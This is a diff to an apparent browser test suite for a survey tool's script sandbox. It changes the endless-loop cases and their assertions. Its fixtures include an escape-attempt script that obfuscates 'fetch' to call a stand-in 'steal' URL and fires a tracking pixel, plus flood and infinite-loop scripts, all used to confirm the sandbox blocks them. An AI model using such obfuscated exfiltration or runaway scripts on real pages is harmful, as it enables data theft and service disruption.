@@ -134,7 +134,8 @@ const q1 = withUx.questions[0].id, q2 = withUx.questions[1].id;
       try { w["fe" + "tch"]("https://example.com/steal").then(() => rs.log("network OPEN"), () => rs.log("network blocked")); } catch (e) { rs.log("network blocked"); }
       try { const I = w["Ima" + "ge"]; const img = new I(); img.src = "https://example.com/pixel"; } catch (e) {}` },
     { id: "flood", label: "Flood", target: { kind: "question", questionId: q1 }, effects: [], script: `const flood = () => { [...Array(60)].forEach(() => rs.addClass("self", "x")); rs.after(0, flood); }; flood();` },
-    { id: "loop", label: "Loop", target: { kind: "question", questionId: q1 }, effects: [], script: `while (true) {}` },
+    { id: "loop", label: "Loop", target: { kind: "question", questionId: q1 }, effects: [], script: `while (true) rs.log("spin");` },
+    { id: "bounded", label: "Bounded loop", target: { kind: "question", questionId: q1 }, effects: [], script: `while (true) { }` },
   ];
   const ev = await openPreview(browser, RUNTIME, { definition: escape }, { viewport: { width: 1200, height: 1000 } });
   const evReq = [];
@@ -144,7 +145,8 @@ const q1 = withUx.questions[0].id, q2 = withUx.questions[1].id;
   assert.equal(evReq.filter((u) => u.includes("example.com")).length, 0, "no request left the sandbox");
   assert.equal(!!(await ev.$('iframe[data-rs-ux-sandbox="flood"]')), false, "a script flooding commands is stopped and its frame removed");
   assert.ok(!!(await ev.$('iframe[data-rs-ux-sandbox="evil"]')), "the escape attempt ran — in its frame");
-  assert.equal(!!(await ev.$('iframe[data-rs-ux-sandbox="loop"]')), false, "a script that fails the gate (a loop) never runs");
+  assert.equal(!!(await ev.$('iframe[data-rs-ux-sandbox="loop"]')), false, "a script that fails the gate (a loop with no braces) never runs");
+  assert.equal(await ev.evaluate(() => 1 + 1), 2, "a braced endless loop is bounded by the runtime: the page stays responsive");
   assert.equal(await ev.evaluate(() => localStorage.getItem("x")), null, "the page's storage untouched");
   await ev.close();
   ok("the sandbox holds: a script cannot touch the page, storage or the network, and one that floods the api is stopped");
@@ -155,6 +157,8 @@ const q1 = withUx.questions[0].id, q2 = withUx.questions[1].id;
   assert.notEqual(await pv.$eval(".rs-shell", (e) => e.dataset.rsBlock), shell.block, "the shell names the new block");
   assert.match(await pv.$eval("#rs-questions", (e) => e.getAttribute("data-rs-ux-play") ?? ""), /uxa_\d+/, "the page transition replays on the new page");
   assert.equal(await pv.$eval("#rs-questions", (e) => getComputedStyle(e).animationName), "rs-ux-fade-in");
+  // a page's frames outlive it by a moment (a Next click already on its way is handled once), then go
+  await pv.waitForFunction(() => !document.querySelector("iframe[data-rs-ux-sandbox]"), null, { timeout: 3000 }).catch(() => {});
   assert.equal(!!(await pv.$('iframe[data-rs-ux-sandbox]')), false, "Q2's script runs only on the page that shows Q2");
   assert.equal(requests.filter((u) => u.includes("example.com")).length, 0);
   await pv.close();
@@ -305,7 +309,7 @@ const UX_REPLY = {
   ] });
   assert.equal(await t.getAttribute("data-mode"), "ux");
   const refused = await page.textContent('[data-testid="cp-refused"]');
-  assert.match(refused, /fetch is not available to survey scripts/); assert.match(refused, /document is not available/);
+  assert.match(refused, /fetch is not available to survey scripts/); assert.match(refused, /cookie is not available/);
   await page.click('[data-testid="cp-ux-code"] summary');
   assert.match(await page.textContent('[data-testid="cp-ux-code"]'), /js · sandboxed[\s\S]*rs\.listen\("select", "self"/);
   await page.waitForSelector('[data-testid="cp-ux-shell"] iframe[data-rs-ux-sandbox]', { state: "attached" });
